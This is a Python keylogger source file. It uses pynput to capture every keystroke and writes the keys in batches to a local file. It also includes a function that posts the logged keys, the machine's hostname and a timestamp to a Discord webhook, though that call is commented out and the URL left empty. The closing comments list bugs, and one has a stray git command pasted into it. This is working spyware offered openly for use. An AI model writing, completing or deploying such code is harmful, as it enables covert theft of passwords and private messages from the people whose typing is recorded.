# Modules
import pynput
from pynput.keyboard import Key, Listener

# Variables

countToSendToDiscord = 0
countForLoggerTextFile = 0
keys = []
loggedKeysTextFile = open("loggedKeys.txt", "r")
contentsOfTextFile = loggedKeysTextFile.read()



# Functions


# Sends fetched keys to Discord Server.
def sendToDiscord( loggedKeysTextFile):

    # Modules
    import socket
    import datetime
    import requests

    # Variables
    device = socket.gethostname()
    date = datetime.datetime.now()
    url = None #Make it reference a file.
    payload = {
        "content" : contentsOfTextFile + "\n From: " + device + "\n Time: " + str(date)
    }
    header = {
        # Make it reference a file.
    }

    # Logic
    requests.post(url, payload, headers=header)
    loggedKeysTextFile.close()

# Writes the keys to a local text file before sending to Discord.
def writefile(keysList):
    with open("loggedKeys.txt", "a") as f:
        for key in keysList:

            k = str(key).replace("'", "")
            if k.find("space") > 0 or k.find("enter") > 0:
                f.write("\n")
            elif k.find("Key") == -1:
                f.write(k)

# Once the key is pressed, logs it.
def on_pressed(Receivedkey):
         
    # Fetching variables
    global countForLoggerTextFile, keys, countToSendToDiscord

    # Incrementation
    keys.append(Receivedkey)
    countForLoggerTextFile += 1
    countToSendToDiscord += 1

    # Logic for determining when to save to the Text File AND for sending to Discord
    if countForLoggerTextFile >= 30:
        print("Keys saved to file.")
        writefile(keys)
        countForLoggerTextFile = 0
        keys = []
    if countToSendToDiscord >= 45:
        # sendToDiscord(loggedKeysTextFile) - Uncomment once we can fetch the Discord channel and Discord account ID without it being hardcoded.
        print("Sent to Discord")
        countToSendToDiscord = 0

# Once the key is released, will check the key that was released. If it's "esc", end program.  
def on_released(ReceivedKey):
    if ReceivedKey == Key.esc: # "esc" is the safe key
        return False

# Listens for the Keys being pressed and released.
with Listener(on_press=on_pressed, on_release=on_released) as listener:
    listener.join()



# Issues:

# Causes an error when "esc" is pressed, should instead be a message to the console
# Discord account and channel are hard-coded (removed to prevent issues), should fetch that info from somewhere remotegit config --global user.email "email@example.com"
# Appends strings within the text file in a weird way, should be refined to be far more human readable